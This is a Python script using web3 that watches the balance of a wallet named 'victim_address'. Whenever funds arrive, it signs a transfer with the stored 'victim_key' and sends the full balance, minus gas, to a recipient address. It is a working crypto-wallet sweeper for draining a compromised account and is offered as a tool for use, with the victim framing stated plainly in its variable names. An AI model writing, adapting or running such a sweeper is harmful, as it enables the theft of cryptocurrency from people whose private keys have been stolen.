from decimal import Decimal

from loguru import logger
from web3 import Web3
from dotenv import load_dotenv

from src.config import Config
from src.logging_config import setup_logging

load_dotenv()
setup_logging()
config = Config()

if config.ganache_mode:
    W3 = Web3(Web3.HTTPProvider(config.ganache_url))
else:
    W3 = Web3(Web3.HTTPProvider(config.infura_url))

# check connecting W3 to Ganache
if W3.is_connected():
    logger.info("started")
else:
    logger.error("error connecting...")

balance = 0

gas_fee = 21000 * 56  # You can change gasfee value
gas_fee = Decimal(gas_fee)
gas_fee = W3.from_wei(gas_fee, "Gwei")

logger.info(f"gas fee is : {gas_fee}")


def get_balance_loop():
    balance = 0
    while True:
        while 0.0005 > balance:
            # Get balance account
            try:
                balance = W3.eth.get_balance(config.victim_address)
                balance = W3.from_wei(balance, "ether")  # convert to ether value
            except Exception as e:
                logger.error(f"error , i can't get balance... error: {e}")

        try:
            balance = balance - gas_fee
            logger.info(f"ETH balance: {balance}")
            build_transaction(balance)
        except Exception as e:
            logger.error(f"Error, check balance and Gasfee again error: {e}")


def build_transaction(balance):
    try:
        # get nonce number
        nonce = W3.eth.get_transaction_count(config.victim_address)

        # build transaction
        tx = {
            "nonce": nonce,
            "to": config.recipient_address,
            "value": W3.to_wei(balance, "ether"),
            "gas": 21000,
            "gasPrice": W3.to_wei("56", "gwei"),
        }

        # sign transaction with private key
        signed_tx = W3.eth.account.sign_transaction(tx, config.victim_key)

        # send Transaction
        tx_hash = W3.eth.send_raw_transaction(signed_tx.rawTransaction)

        logger.info(W3.to_hex(tx_hash))
        logger.info("Transaction Completed\n GET Balance Again...")
        get_balance_loop()
    except Exception as e:
        logger.error(f"ERROR, check buldTransction Funcation {e}")


get_balance_loop()
